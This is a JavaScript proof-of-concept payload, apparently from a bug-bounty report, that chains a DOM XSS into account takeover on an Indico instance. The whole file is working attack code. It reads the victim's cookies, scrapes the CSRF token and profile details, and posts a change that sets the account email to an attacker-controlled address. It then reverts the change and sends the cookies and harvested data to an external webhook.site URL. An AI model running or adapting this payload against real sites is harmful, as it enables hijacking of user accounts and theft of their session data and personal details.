(function () {
  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
  var EVIL_EMAIL = 'brycewhitney.infosec+pwned@gmail.com';
  var cookies = document.cookie;

  fetch('https://indico.iter.org/user/profile/', {
    credentials: 'include'
  })
    .then(function (r) { return r.text(); })
    .then(function (html) {
      var g = function (re) { var m = html.match(re); return m ? m[1] : null; };

      var csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
        || g(/name="csrf_token"[^>]*value="([^"]+)"/);
      var email = g(/name="email"[^>]*value="([^"]+)"/)
        || g(/"email":\s*"([^"]+)"/);
      var firstName = g(/name="first_name"[^>]*value="([^"]+)"/)
        || g(/"first_name":\s*"([^"]+)"/);
      var lastName = g(/name="last_name"[^>]*value="([^"]+)"/)
        || g(/"last_name":\s*"([^"]+)"/);
      var affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
        || g(/"affiliation":\s*"([^"]+)"/);

      var evidence = {
        chain: 'domxss-to-indico-ato',
        origin: location.origin,
        cookies: cookies,
        csrf: csrf,
        email_before: email,
        first_name: firstName,
        last_name: lastName,
        affiliation: affiliation
      };

      if (!csrf || !email) {
        evidence.error = 'missing csrf or email';
        report(evidence);
        return;
      }

      var attackPayload = 'csrf_token=' + encodeURIComponent(csrf)
        + '&first_name=' + encodeURIComponent(firstName || '')
        + '&last_name=' + encodeURIComponent(lastName || '')
        + '&email=' + encodeURIComponent(EVIL_EMAIL)
        + '&affiliation=' + encodeURIComponent('HACKED-VIA-XSS');

      fetch('https://indico.iter.org/user/profile/', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: attackPayload
      })
        .then(function (r) { return r.text(); })
        .then(function (html2) {
          var newEmail = html2.match(/name="email"[^>]*value="([^"]+)"/);
          var newAff = html2.match(/name="affiliation"[^>]*value="([^"]+)"/);
          evidence.email_after = newEmail ? newEmail[1] : '(check profile)';
          evidence.affiliation_after = newAff ? newAff[1] : '(check profile)';
          evidence.email_changed = evidence.email_after === EVIL_EMAIL;

          var revert = 'csrf_token=' + encodeURIComponent(csrf)
            + '&first_name=' + encodeURIComponent(firstName || '')
            + '&last_name=' + encodeURIComponent(lastName || '')
            + '&email=' + encodeURIComponent(email)
            + '&affiliation=' + encodeURIComponent(affiliation || 'YesWeHack');

          fetch('https://indico.iter.org/user/profile/', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: revert
          }).then(function () {
            evidence.reverted = true;
            report(evidence);
          });
        });
    })
    .catch(function (err) {
      report({ chain: 'error', origin: location.origin, cookies: cookies, error: err.message });
    });

  function report(ev) {
    var b = document.createElement('pre');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
      + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
      + 'max-height:50vh;overflow:auto';
    b.textContent = 'PoC: vault-gw DOM XSS → Indico Account Takeover\n'
      + 'CSRF: ' + (ev.csrf || 'n/a') + '\n'
      + 'Email before: ' + (ev.email_before || 'n/a') + '\n'
      + 'Email after:  ' + (ev.email_after || 'n/a') + '\n'
      + 'Email changed: ' + (ev.email_changed ? 'YES' : 'no') + '\n'
      + 'Affiliation: ' + (ev.affiliation_after || 'n/a') + '\n'
      + (ev.reverted ? 'Reverted: yes' : '');
    document.body.appendChild(b);
    navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
  }
})();
